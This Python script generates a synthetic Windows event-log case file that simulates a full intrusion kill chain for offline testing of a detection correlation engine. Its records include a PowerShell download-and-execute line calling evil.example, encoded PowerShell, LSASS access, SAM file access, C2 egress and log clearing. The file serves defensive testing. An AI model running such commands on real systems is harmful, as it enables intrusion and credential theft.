"""Generates a synthetic, realistic intrusion-scenario dataset (JSON case)
covering a full kill chain so the correlation engine can be exercised
end-to-end offline: reconnaissance, brute force, persistence, privilege
escalation, credential access, discovery, execution, defense evasion,
lateral movement and impact.
"""
import json
import os
import uuid
from datetime import datetime, timedelta, timezone

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "case_guest.json")

HOSTS = {"WS-ATTACK": "10.66.0.4", "DB-APP": "10.66.0.20", "AD-CTL": "10.66.0.1"}
BASE = datetime(2026, 9, 15, 9, 0, 0, tzinfo=timezone.utc)

rows = []


def _iso(offset_min, offset_sec=0):
    return (BASE + timedelta(minutes=offset_min, seconds=offset_sec)).isoformat().replace("+00:00", "Z")


def add(off, event_id, channel, data, host="WS-ATTACK", provider="Microsoft-Windows-Security-Auditing",
        message=""):
    ts = _iso(off[0], off[1] if len(off) > 1 else 0)
    rows.append({
        "id": str(uuid.uuid4()), "ts": ts,
        "ts_epoch": datetime.fromisoformat(ts.replace("Z", "+00:00")).timestamp(),
        "channel": channel.lower(), "event_id": event_id,
        "provider": provider, "computer": host, "level": 0,
        "source_ip": data.get("IpAddress", ""),
        "target_user": data.get("TargetUserName", "") or data.get("SamAccountName", ""),
        "subject_user": data.get("SubjectUserName", ""),
        "process": data.get("NewProcessName", "") or data.get("Image", ""),
        "commandline": data.get("CommandLine", ""),
        "data": data, "imported": "json",
        "message": message,
        "hash": "",
    })


# --- foreground noise / normal ops ----------------------------------------
add((0, 5), 4624, "Security", {"TargetUserName": "jsmith", "LogonType": "2",
     "LogonProcessName": "User32", "IpAddress": "-"}, message="jsmith interactive logon")
add((1, 0), 4688, "Security", {"NewProcessName": "C:\\Windows\\System32\\notepad.exe",
     "SubjectUserName": "jsmith", "CommandLine": "notepad.exe notes.txt"},
    message="notepad launch")
add((3, 0), 4724, "Security", {"TargetUserName": "mvance", "SubjectUserName": "helpdesk.service"},
    message="expected password reset")

# --- RECONNAISSANCE ---------------------------------------------------------
# credential validation enumeration attempts
for u in ["admin", "svc-oracle", "root", "backup", "corpadmin", "kjoseph"]:
    add((6, 12 + rows.__len__()), 4776, "Security",
        {"PackageName": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0", "Status": "0xC000006A",
         "TargetUserName": u, "Workstation": "WS-ATTACK"})

# --- INITIAL ACCESS / CREDENTIAL ACCESS: password spray ---------------------
for i in range(6):
    add((9, i * 4), 4625, "Security",
        {"TargetUserName": "Administrator", "LogonType": "8",
         "IpAddress": "10.66.0.4", "FailureReason": "%%2313", "Status": "0xC000006D"},
        message="failed logon Administrator from 10.66.0.4")
add((10, 30), 4740, "Security", {"TargetUserName": "kjoseph",
    "CallerComputerName": "WS-ATTACK"}, message="account locked out")

# --- PERSISTENCE -------------------------------------------------------------
add((14, 0), 4722, "Security", {"TargetUserName": "backup_acct", "SubjectUserName": "svc-deploy"},
    message="backup_acct enabled")
add((15, 0), 4720, "Security", {"SamAccountName": "support_x9", "SubjectUserName": "backup_acct"},
    message="support_x9 created")
add((15, 40), 4732, "Security", {"MemberName": "CORP\\support_x9",
     "TargetUserName": "Administrators", "SubjectUserName": "backup_acct"},
    message="support_x9 added to Administrators")
add((16, 0), 7045, "System", {"param1": "svchost-update", "param2": "C:\\Windows\\Temp\\svc.exe"},
    message="service svchost-update installed")
add((16, 45), 4698, "Security", {"TaskName": "\\Microsoft\\Windows\\Updater\\UPD-1",
     "SubjectUserName": "support_x9"}, message="scheduled task created")

# --- PRIVILEGE ESCALATION ------------------------------------------------------
add((17, 0), 4672, "Security", {"SubjectUserName": "support_x9"},
    message="special privileges assigned")
add((18, 0), 4688, "Security",
    {"NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "SubjectUserName": "support_x9", "CommandLine": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKAApAA=="},
    message="encoded powershell from elevated account")

# --- EXECUTION / C2 ------------------------------------------------------------
add((18, 20), 4104, "Microsoft-Windows-PowerShell/Operational",
    {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://evil.example/ps.ps1')",
     "DataLength": "1024"},
    message="PowerShell ScriptBlock with remote download")
add((18, 35), 1, "Microsoft-Windows-Sysmon/Operational",
    {"Image": "C:\\Users\\Public\\payload.exe", "CommandLine": "payload.exe -enc",
     "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
    provider="Microsoft-Windows-Sysmon", message="payload.exe execution")
add((19, 0), 11, "Microsoft-Windows-Sysmon/Operational",
    {"TargetFilename": "C:\\Users\\Public\\payload.exe"},
    provider="Microsoft-Windows-Sysmon", message="exe dropped to Public")

# --- CREDENTIAL ACCESS ----------------------------------------------------------
add((19, 30), 10, "Microsoft-Windows-Sysmon/Operational",
    {"TargetImage": "C:\\Windows\\System32\\lsass.exe", "SourceImage": "C:\\Users\\Public\\payload.exe",
     "GrantedAccess": "0x1010", "CallTrace": "dbghelp.dll"},
    provider="Microsoft-Windows-Sysmon", message="LSASS access attempt")

# --- DISCOVERY --------------------------------------------------------------------
add((20, 0), 5145, "Security",
    {"ShareName": "\\\\*\\C$", "RelativeTargetName": "hidden", "SubjectUserName": "support_x9",
     "IpAddress": "10.66.0.4"}, message="SMB share path access on ADMIN share")
add((20, 30), 4663, "Security", {"ObjectName": "C:\\Windows\\repair\\SAM", "SubjectUserName": "support_x9"},
    message="object access on SAM database")

# --- LATERAL MOVEMENT -------------------------------------------------------------
add((22, 0), 4624, "Security", {"TargetUserName": "support_x9", "LogonType": "10",
     "IpAddress": "10.66.0.4", "LogonProcessName": "NtLmSsp"}, host="DB-APP",
    message="RDP logon to DB-APP")
add((22, 45), 4648, "Security", {"SubjectUserName": "support_x9", "TargetUserName": "Administrator",
     "IpAddress": "10.66.0.4", "TargetServerName": "AD-CTL"},
    message="explicit credentials toward AD-CTL")
add((23, 10), 4624, "Security", {"TargetUserName": "svc-deploy", "LogonType": "3",
     "IpAddress": "10.66.0.20", "AccountType": "User"}, host="AD-CTL",
    message="network logon to AD-CTL")

# --- DEFENSE EVASION -----------------------------------------------------------------
add((24, 0), 4719, "Security", {"SubjectUserName": "support_x9",
     "CategoryId": "%{0CCE9210-69AE-11D9-BED3-505054503030}"},
    message="audit policy modified")
add((25, 0), 1116, "Microsoft-Windows-Windows Defender/Operational",
    {"ThreatName": "Trojan:Win64/SilverBC", "Path": "C:\\Windows\\Temp\\svc.exe",
     "ProcessName": "svc.exe"},
    provider="Microsoft-Windows-Windows Defender", message="Defender detected threat")
add((26, 0), 5157, "Microsoft-Windows-WFP/Operational",
    {"Application": "C:\\Users\\Public\\payload.exe", "DestAddress": "88.202.10.99",
     "DestPort": "4444", "LayerName": "%%14605"},
    provider="Microsoft-Windows-WFP", message="egress blocked toward C2")
add((27, 0), 1102, "Security", {"SubjectUserName": "support_x9"},
    message="SECURITY LOG CLEARED")
add((27, 10), 104, "System", {"Channel": "System"}, message="System log cleared")


def main():
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    with open(OUT, "w", encoding="utf-8") as fh:
        json.dump({"tool": "WEL-Intrusion-Suite", "case_id": "C-TEST-GUEST",
                   "generated_at": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
                   "events": rows}, fh, ensure_ascii=False, indent=1)
    print("wrote %d events -> %s" % (len(rows), OUT))


if __name__ == "__main__":
    main()